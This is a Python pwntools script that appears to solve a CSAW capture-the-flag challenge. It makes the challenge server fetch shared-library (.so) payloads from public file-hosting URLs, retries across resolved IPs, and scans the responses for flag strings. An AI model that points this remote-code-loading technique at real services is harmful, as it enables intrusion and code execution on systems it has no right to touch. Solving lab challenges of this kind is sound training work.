#!/usr/bin/env python3
from pwn import *
import time, socket, re, os, sys

context.log_level='info'
HOST='rev.chal.csaw.io'
PORT=8000
URLS=['https://d.uguu.se/ORZgstzv.so','https://files.catbox.moe/m71mfv.so']
TIMEOUT=120


def resolve_ips(host):
    ips=[]
    try:
        infos=socket.getaddrinfo(host,None,socket.AF_INET,socket.SOCK_STREAM)
        for i in infos:
            ip=i[4][0]
            if ip not in ips:
                ips.append(ip)
    except Exception as e:
        log.warning(f'resolve failed: {e}')
    return ips


def try_once(target_host,url,outfile):
    io=remote(target_host,PORT,timeout=10)
    io.recvuntil(b'>>>',timeout=10)
    io.sendline(url.encode())
    data=b''
    end=time.time()+TIMEOUT
    while time.time()<end:
        try:
            chunk=io.recv(timeout=2)
            if not chunk:
                break
            data += chunk
        except EOFError:
            break
        except Exception:
            pass
    io.close()
    with open(outfile,'ab') as f:
        f.write(b'\n===== target='+str(target_host).encode()+b' url='+url.encode()+b' =====\n')
        f.write(data)
    return data


def scan(data):
    pats=[rb'flag\{[^}]+\}',rb'csaw\{[^}]+\}']
    hits=[]
    for p in pats:
        hits += re.findall(p,data,re.I)
    # broad near flag word
    for m in re.finditer(rb'flag[^\n\r]{0,200}',data,re.I):
        hits.append(m.group(0))
    uniq=[]
    for h in hits:
        if h not in uniq:
            uniq.append(h)
    return uniq


def run(urls):
    outfile='/home/ctfplayer/out.bin'
    open(outfile,'wb').close()
    targets=[HOST]+resolve_ips(HOST)
    log.info(f'targets: {targets}')
    attempts=0
    for backoff in [1,2,4,8,16]:
        for t in targets:
            for u in urls:
                attempts+=1
                log.info(f'attempt {attempts}: {t} {u}')
                try:
                    data=try_once(t,u,outfile)
                    hits=scan(data)
                    if hits:
                        print('HITS')
                        for h in hits:
                            print(h.decode('latin1','ignore'))
                        return True
                except Exception as e:
                    log.warning(f'fail: {e}')
        time.sleep(backoff)
    return False

if __name__=='__main__':
    ok=run(URLS)
    print('done',ok)

